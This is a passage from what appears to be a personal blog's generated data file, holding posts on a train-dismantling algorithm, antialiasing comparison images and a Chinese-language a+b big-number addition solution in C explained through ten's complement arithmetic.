class=\"line\">\tTSP.StartSearch();</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> c;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%c\"</span>,&amp;c);</span><br><span class=\"line\">\treturn <span class=\"number\">0</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>输入文件叫做“48.txt”，格式如下<br><a href=\"/other/48.txt\">48.txt</a></p>\n<p>###列车解体问题###<br>输入文件格式如下：<br>首先是到达列车的数量，然后分别写出每个列车的信息<br>然后是出发列车的数量，然后写出每个列车的信息<br><a href=\"/other/aco_input.txt\">aco_input.txt</a></p>"},{"title":"With or Without Antialiasing","date":"2016-06-02T17:40:29.000Z","_content":"Two pictures:\n<!--more-->\n## With Anti ##\n![](/image/machine_fingerprinting/Susan_with_anti.png)\n## Without Anti ##\n![](/image/machine_fingerprinting/Susan_without_anti.png)\n## original subtraction ##\n![](/image/machine_fingerprinting/origin_compare_anti.png)\n## subtract 1 ##\n![](/image/machine_fingerprinting/anti_subtract1.png)\n## subtract 2 ##\n![](/image/machine_fingerprinting/anti_subtract2.png)\n","source":"_posts/With-or-Without-Antialiasing.md","raw":"---\ntitle: With or Without Antialiasing\ndate: 2016-06-02 17:40:29\ntags: Machine Fingerprinting\n---\nTwo pictures:\n<!--more-->\n## With Anti ##\n![](/image/machine_fingerprinting/Susan_with_anti.png)\n## Without Anti ##\n![](/image/machine_fingerprinting/Susan_without_anti.png)\n## original subtraction ##\n![](/image/machine_fingerprinting/origin_compare_anti.png)\n## subtract 1 ##\n![](/image/machine_fingerprinting/anti_subtract1.png)\n## subtract 2 ##\n![](/image/machine_fingerprinting/anti_subtract2.png)\n","slug":"With-or-Without-Antialiasing","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vk002fwypd0mao33x7","content":"<p>Two pictures:<br><a id=\"more\"></a></p>\n<h2 id=\"With-Anti\"><a href=\"#With-Anti\" class=\"headerlink\" title=\"With Anti\"></a>With Anti</h2><p><img src=\"/image/machine_fingerprinting/Susan_with_anti.png\" alt=\"\"></p>\n<h2 id=\"Without-Anti\"><a href=\"#Without-Anti\" class=\"headerlink\" title=\"Without Anti\"></a>Without Anti</h2><p><img src=\"/image/machine_fingerprinting/Susan_without_anti.png\" alt=\"\"></p>\n<h2 id=\"original-subtraction\"><a href=\"#original-subtraction\" class=\"headerlink\" title=\"original subtraction\"></a>original subtraction</h2><p><img src=\"/image/machine_fingerprinting/origin_compare_anti.png\" alt=\"\"></p>\n<h2 id=\"subtract-1\"><a href=\"#subtract-1\" class=\"headerlink\" title=\"subtract 1\"></a>subtract 1</h2><p><img src=\"/image/machine_fingerprinting/anti_subtract1.png\" alt=\"\"></p>\n<h2 id=\"subtract-2\"><a href=\"#subtract-2\" class=\"headerlink\" title=\"subtract 2\"></a>subtract 2</h2><p><img src=\"/image/machine_fingerprinting/anti_subtract2.png\" alt=\"\"></p>\n","excerpt":"<p>Two pictures:<br>","more":"</p>\n<h2 id=\"With-Anti\"><a href=\"#With-Anti\" class=\"headerlink\" title=\"With Anti\"></a>With Anti</h2><p><img src=\"/image/machine_fingerprinting/Susan_with_anti.png\" alt=\"\"></p>\n<h2 id=\"Without-Anti\"><a href=\"#Without-Anti\" class=\"headerlink\" title=\"Without Anti\"></a>Without Anti</h2><p><img src=\"/image/machine_fingerprinting/Susan_without_anti.png\" alt=\"\"></p>\n<h2 id=\"original-subtraction\"><a href=\"#original-subtraction\" class=\"headerlink\" title=\"original subtraction\"></a>original subtraction</h2><p><img src=\"/image/machine_fingerprinting/origin_compare_anti.png\" alt=\"\"></p>\n<h2 id=\"subtract-1\"><a href=\"#subtract-1\" class=\"headerlink\" title=\"subtract 1\"></a>subtract 1</h2><p><img src=\"/image/machine_fingerprinting/anti_subtract1.png\" alt=\"\"></p>\n<h2 id=\"subtract-2\"><a href=\"#subtract-2\" class=\"headerlink\" title=\"subtract 2\"></a>subtract 2</h2><p><img src=\"/image/machine_fingerprinting/anti_subtract2.png\" alt=\"\"></p>"},{"title":"a+b","date":"2014-12-13T15:40:12.000Z","_content":"开宗明义a+b\n<!--more-->\n##a+b##\n时间限制: 1秒  内存限制: 64M\n###Problem Description###\nNow let’s calculate the answer of a + b ~\n###Input###\nThe input will consist of a set of pairs of integers for a and b(-10^1000 <= a, b <= 10^1000). The input is ended by EOF.\n###Output###\nFor each test case you should output the answer of a + b.\n###Sample Input###\n```\n1 1\n1 -1\n```\n###Sample Output###\n```\n2\n0\n```\n##解答\n\n开宗明义啊，a+b肯定是第一道题。但是这个肯定不是传统意义上的printf(\"%d\\n\",a+b);这种啦，这里绝壁是一个大数加法。想来写个大数加法也不是什么难事。\n这里有一个要介绍一下的关键点，就是所谓的十进制补码。减去一个数等价于加上这个数的十进制补码啦，下边的这个change函数就是用来干这件事情的\n关于补码，我有话要说：\n从刚上大学开始老师就教我们，二进制负数的补码怎么求怎么求，从来没人说过到底是为什么。补码是什么呢？正数的补码是本身，至于负数，先看一个公式：\n> (a + -a) % p = 0\n> $p = base ^ {(n - 1)}$\n\n**这里注意base是进制数，n是机器位数**\n这两个公式其实就告诉了我们什么是补码。补码其实就是机器取机器最大表示数的余数。\n这里我们就可以解释一下为啥减去一个数等于加上这个数的补码，这里有两点\n**1,减去一个数可以认为是加上这个数的负数形式。\n2,加上这个数的负数形式在模余概念上等于加上这个数的补码。**\n举个例子吧，250-123这个例子。这里呢，250-123 = 250 + (-123)。如果机器最大容纳1000，那么就是\n>(250 + (-123)) % 1000 = (250 + 1000 + (-123)) % 1000 = (250 + 877) % 1000;\n\n这里877是123的补码。所以大概知道为什么了吧。\n下边的代码就是检测如果输入了负数，变成补码，最后统一处理加法就好了。写的很容易懂。\n**代码是大一写的，看起来没啥问题，这种题目就不重写了，凑合看吧**\n```\n#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<math.h>\n#define MAX 1024\n\nvoid change(int *a)//转换十进制补码\n{\n\tint i,x = 1;\n\tfor(i = MAX - 1;i > 0;i --)\n\t{\n\t\ta[i] = 9 - a[i];\n\t\ta[i] += x;\n\t\tx = a[i] > 9;\n\t\tif(a[i] > 9) a[i] -= 10;\n\t}\n}\n\nint input(int *a) //input 的部分啦，\n{\n\tint len,i,j = MAX;\n\tchar tem[MAX];\n\tmem(a,0);\n\tmem(tem,0);\n\tif(scanf(\"%s\",tem) == EOF) return 0;\n\tlen = strlen(tem);\n\tfor(i = len - 1;i >= 0 && tem[i] != '-';i --)\n\t{\n\t\ta[-- j] = tem[i] - '0';\n\t}\n\tif(tem[0] == '-') change(a);//如果是负数的话就变一下形式。这里用了十进制补码\n\treturn 1;\n}\n\nvoid HPplus(int *a,int *b,int *res)\n{\n\tint i,x = 0;\n\tmem(res,0);\n\tfor(i = MAX - 1;i > 0;i --)\n\t{\n\t\tres[i] = a[i] + b[i] + x;\n\t\tx = (res[i] >= 10);\n\t\tif(res[i] >= 10) res[i] -= 10;\n\t}\n}\n\nvoid output(int *res)\n{\n\tint i,flag = 0;\n\tif(res[1] == 9)\n\t{\n\t\tchange(res);\n\t\tprintf(\"-\");\n\t}\n\tfor(i = 1;i < MAX && res[i] == 0;i ++);\n\tfor(;i < MAX;i ++)\n\t{\n\t\tprintf(\"%d\",res[i]);\n\t\tflag = 1;\n\t}\n\tif(!flag) printf(\"0\");\n\tprintf(\"\\n\");\n}\n\nint main()\n{\n\tint a[MAX],b[MAX];\n\tint res[MAX];\n\twhile(input(a) && input(b))\n\t{\n\t\tHPplus(a,b,res);\n\t\toutput(res);\n\t}\n}\n```","source":"_posts/ab.md","raw":"title: a+b\ndate: 2014-12-13 15:40:12\ntags: Algorithm\ncategories: Algorithm_Road to Success\n---\n开宗明义a+b\n<!--more-->\n##a+b##\n时间限制: 1秒  内存限制: 64M\n###Problem Description###\nNow let’s calculate the answer of a + b ~\n###Input###\nThe input will consist of a set of pairs of integers for a and b(-10^1000 <= a, b <= 10^1000). The input is ended by EOF.\n###Output###\nFor each test case you should output the answer of a + b.\n###Sample Input###\n```\n1 1\n1 -1\n```\n###Sample Output###\n```\n2\n0\n```\n##解答\n\n开宗明义啊，a+b肯定是第一道题。但是这个肯定不是传统意义上的printf(\"%d\\n\",a+b);这种啦，这里绝壁是一个大数加法。想来写个大数加法也不是什么难事。\n这里有一个要介绍一下的关键点，就是所谓的十进制补码。减去一个数等价于加上这个数的十进制补码啦，下边的这个change函数就是用来干这件事情的\n关于补码，我有话要说：\n从刚上大学开始老师就教我们，二进制负数的补码怎么求怎么求，从来没人说过到底是为什么。补码是什么呢？正数的补码是本身，至于负数，先看一个公式：\n> (a + -a) % p = 0\n> $p = base ^ {(n - 1)}$\n\n**这里注意base是进制数，n是机器位数**\n这两个公式其实就告诉了我们什么是补码。补码其实就是机器取机器最大表示数的余数。\n这里我们就可以解释一下为啥减去一个数等于加上这个数的补码，这里有两点\n**1,减去一个数可以认为是加上这个数的负数形式。\n2,加上这个数的负数形式在模余概念上等于加上这个数的补码。**\n举个例子吧，250-123这个例子。这里呢，250-123 = 250 + (-123)。如果机器最大容纳1000，那么就是\n>(250 + (-123)) % 1000 = (250 + 1000 + (-123)) % 1000 = (250 + 877) % 1000;\n\n这里877是123的补码。所以大概知道为什么了吧。\n下边的代码就是检测如果输入了负数，变成补码，最后统一处理加法就好了。写的很容易懂。\n**代码是大一写的，看起来没啥问题，这种题目就不重写了，凑合看吧**\n```\n#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<math.h>\n#define MAX 1024\n\nvoid change(int *a)//转换十进制补码\n{\n\tint i,x = 1;\n\tfor(i = MAX - 1;i > 0;i --)\n\t{\n\t\ta[i] = 9 - a[i];\n\t\ta[i] += x;\n\t\tx = a[i] > 9;\n\t\tif(a[i] > 9) a[i] -= 10;\n\t}\n}\n\nint input(int *a) //input 的部分啦，\n{\n\tint len,i,j = MAX;\n\tchar tem[MAX];\n\tmem(a,0);\n\tmem(tem,0);\n\tif(scanf(\"%s\",tem) == EOF) return 0;\n\tlen = strlen(tem);\n\tfor(i = len - 1;i >= 0 && tem[i] != '-';i --)\n\t{\n\t\ta[-- j] = tem[i] - '0';\n\t}\n\tif(tem[0] == '-') change(a);//如果是负数的话就变一下形式。这里用了十进制补码\n\treturn 1;\n}\n\nvoid HPplus(int *a,int *b,int *res)\n{\n\tint i,x = 0;\n\tmem(res,0);\n\tfor(i = MAX - 1;i > 0;i --)\n\t{\n\t\tres[i] = a[i] + b[i] + x;\n\t\tx = (res[i] >= 10);\n\t\tif(res[i] >= 10) res[i] -= 10;\n\t}\n}\n\nvoid output(int *res)\n{\n\tint i,flag = 0;\n\tif(res[1] == 9)\n\t{\n\t\tchange(res);\n\t\tprintf(\"-\");\n\t}\n\tfor(i = 1;i < MAX && res[i] == 0;i ++);\n\tfor(;i < MAX;i ++)\n\t{\n\t\tprintf(\"%d\",res[i]);\n\t\tflag = 1;\n\t}\n\tif(!flag) printf(\"0\");\n\tprintf(\"\\n\");\n}\n\nint main()\n{\n\tint a[MAX],b[MAX];\n\tint res[MAX];\n\twhile(input(a) && input(b))\n\t{\n\t\tHPplus(a,b,res);\n\t\toutput(res);\n\t}\n}\n```","slug":"ab","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vl002hwypdedb9h64b","content":"<p>开宗明义a+b<br><a id=\"more\"></a></p>\n<p>##a+b##<br>时间限制: 1秒  内存限制: 64M</p>\n<p>###Problem Description###<br>Now let’s calculate the answer of a + b ~</p>\n<p>###Input###<br>The input will consist of a set of pairs of integers for a and b(-10^1000 &lt;= a, b &lt;= 10^1000). The input is ended by EOF.</p>\n<p>###Output###<br>For each test case you should output the answer of a + b.</p>\n<p>###Sample Input###<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">1 </span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">1 </span>-<span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>###Sample Output###<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<p>##解答</p>\n<p>开宗明义啊，a+b肯定是第一道题。但是这个肯定不是传统意义上的printf(“%d\\n”,a+b);这种啦，这里绝壁是一个大数加法。想来写个大数加法也不是什么难事。<br>这里有一个要介绍一下的关键点，就是所谓的十进制补码。减去一个数等价于加上这个数的十进制补码啦，下边的这个change函数就是用来干这件事情的<br>关于补码，我有话要说：<br>从刚上大学开始老师就教我们，二进制负数的补码怎么求怎么求，从来没人说过到底是为什么。补码是什么呢？正数的补码是本身，至于负数，先看一个公式：</p>\n<blockquote>\n<p>(a + -a) % p = 0<br>$p = base ^ {(n - 1)}$</p>\n</blockquote>\n<p><strong>这里注意base是进制数，n是机器位数</strong><br>这两个公式其实就告诉了我们什么是补码。补码其实就是机器取机器最大表示数的余数。<br>这里我们就可以解释一下为啥减去一个数等于加上这个数的补码，这里有两点<br><strong>1,减去一个数可以认为是加上这个数的负数形式。<br>2,加上这个数的负数形式在模余概念上等于加上这个数的补码。</strong><br>举个例子吧，250-123这个例子。这里呢，250-123 = 250 + (-123)。如果机器最大容纳1000，那么就是</p>\n<blockquote>\n<p>(250 + (-123)) % 1000 = (250 + 1000 + (-123)) % 1000 = (250 + 877) % 1000;</p>\n</blockquote>\n<p>这里877是123的补码。所以大概知道为什么了吧。<br>下边的代码就是检测如果输入了负数，变成补码，最后统一处理加法就好了。写的很容易懂。<br><strong>代码是大一写的，看起来没啥问题，这种题目就不重写了，凑合看吧</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">change</span><span class=\"params\">(<span class=\"keyword\">int</span> *a)</span><span class=\"comment\">//转换十进制补码</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,x = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = MAX - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[i] = <span class=\"number\">9</span> - a[i];</span><br><span class=\"line\">\t\ta[i] += x;</span><br><span class=\"line\">\t\tx = a[i] &gt; <span class=\"number\">9</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] &gt; <span class=\"number\">9</span>) a[i] -= <span class=\"number\">10</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">input</span><span class=\"params\">(<span class=\"keyword\">int</span> *a)</span> <span class=\"comment\">//input 的部分啦，</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> len,i,j = MAX;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> tem[MAX];</span><br><span class=\"line\">\tmem(a,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tmem(tem,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,tem) == EOF) return <span class=\"number\">0</span>;</span><br><span class=\"line\">\tlen = <span class=\"built_in\">strlen</span>(tem);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = len - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span> &amp;&amp; tem[i] != <span class=\"string\">'-'</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[-- j] = tem[i] - <span class=\"string\">'0'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(tem[<span class=\"number\">0</span>] == <span class=\"string\">'-'</span>) change(a);<span class=\"comment\">//如果是负数的话就变一下形式。这里用了十进制补码</span></span><br><span class=\"line\">\treturn <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">HPplus</span><span class=\"params\">(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b,<span class=\"keyword\">int</span> *res)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,x = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tmem(res,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = MAX - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tres[i] = a[i] + b[i] + x;</span><br><span class=\"line\">\t\tx = (res[i] &gt;= <span class=\"number\">10</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(res[i] &gt;= <span class=\"number\">10</span>) res[i] -= <span class=\"number\">10</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">output</span><span class=\"params\">(<span class=\"keyword\">int</span> *res)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(res[<span class=\"number\">1</span>] == <span class=\"number\">9</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tchange(res);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"-\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>;i &lt; MAX &amp;&amp; res[i] == <span class=\"number\">0</span>;i ++);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;i &lt; MAX;i ++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>,res[i]);</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!flag) <span class=\"built_in\">printf</span>(<span class=\"string\">\"0\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a[MAX],b[MAX];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> res[MAX];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(input(a) &amp;&amp; input(b))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tHPplus(a,b,res);</span><br><span class=\"line\">\t\toutput(res);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>开宗明义a+b<br>","more":"</p>\n<p>##a+b##<br>时间限制: 1秒  内存限制: 64M</p>\n<p>###Problem Description###<br>Now let’s calculate the answer of a + b ~</p>\n<p>###Input###<br>The input will consist of a set of pairs of integers for a and b(-10^1000 &lt;= a, b &lt;= 10^1000). The input is ended by EOF.</p>\n<p>###Output###<br>For each test case you should output the answer of a + b.</p>\n<p>###Sample Input###<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">1 </span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"symbol\">1 </span>-<span class=\"number\">1</span></span><br></pre></td></tr></table></figure></p>\n<p>###Sample Output###<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2</span><br><span class=\"line\">0</span><br></pre></td></tr></table></figure></p>\n<p>##解答</p>\n<p>开宗明义啊，a+b肯定是第一道题。但是这个肯定不是传统意义上的printf(“%d\\n”,a+b);这种啦，这里绝壁是一个大数加法。想来写个大数加法也不是什么难事。<br>这里有一个要介绍一下的关键点，就是所谓的十进制补码。减去一个数等价于加上这个数的十进制补码啦，下边的这个change函数就是用来干这件事情的<br>关于补码，我有话要说：<br>从刚上大学开始老师就教我们，二进制负数的补码怎么求怎么求，从来没人说过到底是为什么。补码是什么呢？正数的补码是本身，至于负数，先看一个公式：</p>\n<blockquote>\n<p>(a + -a) % p = 0<br>$p = base ^ {(n - 1)}$</p>\n</blockquote>\n<p><strong>这里注意base是进制数，n是机器位数</strong><br>这两个公式其实就告诉了我们什么是补码。补码其实就是机器取机器最大表示数的余数。<br>这里我们就可以解释一下为啥减去一个数等于加上这个数的补码，这里有两点<br><strong>1,减去一个数可以认为是加上这个数的负数形式。<br>2,加上这个数的负数形式在模余概念上等于加上这个数的补码。</strong><br>举个例子吧，250-123这个例子。这里呢，250-123 = 250 + (-123)。如果机器最大容纳1000，那么就是</p>\n<blockquote>\n<p>(250 + (-123)) % 1000 = (250 + 1000 + (-123)) % 1000 = (250 + 877) % 1000;</p>\n</blockquote>\n<p>这里877是123的补码。所以大概知道为什么了吧。<br>下边的代码就是检测如果输入了负数，变成补码，最后统一处理加法就好了。写的很容易懂。<br><strong>代码是大一写的，看起来没啥问题，这种题目就不重写了，凑合看吧</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">change</span><span class=\"params\">(<span class=\"keyword\">int</span> *a)</span><span class=\"comment\">//转换十进制补码</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,x = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = MAX - <span class=\"number\">1</span>;i &gt; <span class=\"number\">0</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[i] = <span class=\"number\">9</span> - a[i];</span><br><span class=\"line\">\t\ta[i] += x;</span><br><span class=\"line\">\t\tx = a[i] &gt; <span class=\"number\">9</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] &gt; <span class=\"number\">9</span>) a[i] -= <span class=\"number\">10</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">input</span><span class=\"params\">(<span class=\"keyword\">int</span> *a)</span> <span class=\"comment\">//input 的部分啦，</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> len,i,j = MAX;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> tem[MAX];</span><br><span class=\"line\">\tmem(a,<span class=\"number\">0</span>);</span><br><span class=\"line\">\tmem(tem,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,tem) == EOF) return <span class=\"number\">0</span>;</span><br><span class=\"line\">\tlen = <span class=\"built_in\">strlen</span>(tem);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = len - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span> &amp;&amp; tem[i] != <span class=\"string\">'-'</span>;i --)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta[-- j] = tem[i] - <span class=\"string\">'0'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span 